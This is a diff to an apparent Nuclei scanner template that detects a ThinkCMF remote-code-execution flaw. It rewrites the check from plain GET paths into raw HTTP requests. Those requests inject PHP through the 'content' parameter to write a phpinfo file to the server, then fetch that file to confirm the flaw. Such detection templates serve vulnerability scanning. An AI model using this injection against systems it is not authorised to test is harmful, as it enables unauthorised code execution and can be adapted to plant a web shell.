@@ -8,21 +8,20 @@ info:
   tags: thinkcmf,rce
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/index.php?a=fetch&content=%3C?php+file_put_contents(%22poc.php%22,%22%3C?php+echo+phpinfo()%3B%22)%3B"
-  - method: GET
-    path:
-      - "{{BaseURL}}/poc.php"
+  - raw:
+      - |
+        GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo phpinfo();\");')}} HTTP/1.1
+        Host: {{Hostname}}
 
-    matchers-condition: and
+      - |
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
     matchers:
-      - type: word
-        words:
-          - "PHP Extension"
-          - "PHP Version"
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "PHP Extension")'
+          - 'contains(body_2, "PHP Version")'
+          - 'status_code_2 == 200'
         condition: and
-
-      - type: status
-        status:
-          - 200
